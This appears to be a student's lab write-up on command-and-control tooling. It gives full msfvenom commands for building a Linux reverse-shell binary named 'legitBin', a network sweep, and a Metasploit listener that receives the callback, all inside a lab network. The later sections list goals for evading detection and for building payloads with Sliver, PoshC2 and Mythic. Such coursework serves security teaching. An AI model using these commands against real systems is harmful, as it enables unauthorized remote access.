# A) Venom
**Objective**
- Create malware using msfvenom that spins up a reverse shell
- Accept the connection using metasploits multi/handler

## What's msfvenom?
=> A payload generator and encoder
- Source: msfvenom man pages

# ReverC 🐚
We spin up the Kali VM and go straight to
```bash
$ man msfvenom
```
Then craft the payload:
```bash
$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin 
$ chmod +x legitBin
```
`-p` - Payload to use
`-f` - Output format
`-o` - Save payload `[path]`



Now we have a payload => `legitBin`, let's distribute it.

Get the ip of the victim:
```bash
$ sudo nmap -sn -T4 192.168.130.0/24

Nmap scan report for metasploitable3-ub1404 (192.168.130.202)
Host is up (0.00048s latency).
MAC Address: 52:54:00:6C:7D:C1 (QEMU virtual NIC)
```

Then send (play along and imagine we execute an attack where we get the payload to victims machine):
```bash
$ rsync -av ./legitBin.exe vagrant@192.168.130.202:/home/vagrant/
```
I'm using `rsync` here to send it over via SSH, let's play we execute a succesful attack and get the payload on the victims machine.


In `msfconsole` we use the `multi/handler` module to act as a listener:
```console
msf > search multi/handler
msf > use 5
msf exploit(multi/handler) > options
msf exploit(multi/handler) > set LHOST 192.168.130.233
LHOST => 192.168.130.233
msf exploit(multi/handler) > set LPORT 4040
LPORT => 4040

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.130.233:4040 
```
Now that the listener is running we can execute the payload on victims machine.

<img width="766" height="150" alt="2026-04-29-14:08:37" src="https://github.com/user-attachments/assets/812d13e6-a82a-474c-aba6-10d0a135d88f" />

### BUT
<img width="792" height="62" alt="2026-04-29-14:09:06" src="https://github.com/user-attachments/assets/22861eef-cdb3-4e3b-9f2d-7d92d518f92e" />

And connection closed :/
<img width="894" height="170" alt="2026-04-29-14:09:18" src="https://github.com/user-attachments/assets/3d065731-c331-411b-b7c2-d52bdc4058a3" />


Let's try something else.





# B) Sniff venom
**Objective**
- Inspect and analyze the reverse shell connection using a packet sniffer such as Wireshark
  - What do you observe?
  - What makes the connection detectable?
  - How would one obscure the detection?
 




# C) Hello Sliver
**Objective**
- Show an example of an HTTP-connection using Sliver




# D) Sniff Sliver
**Objective**
- Inspect the Sliver http-connection usin a packet sniffer
  - What do you observe?
  - What makes the connection detectable?
 

# E) Hiding in plain sight
**Objective**
- One can modify the connection details using Sliver
- Try and show an example
- Showcase that it works


# F) Multitalent
**Objective**
- Sliver is good for a lot
- Show examples of some of it's features



# I) Bonus: Veil
**Objective**
- Try out Veil


# J) Bonus: ScareCrow
**Objective**
- Try out ScareCrow

# K) Bonus: PoshC2
**Objective**
- Create malware that executes a reverse shell using PoshC2



# L) Bonus: Mythic
**Objective**
- Create malware that executes a reverse shell using Mythic
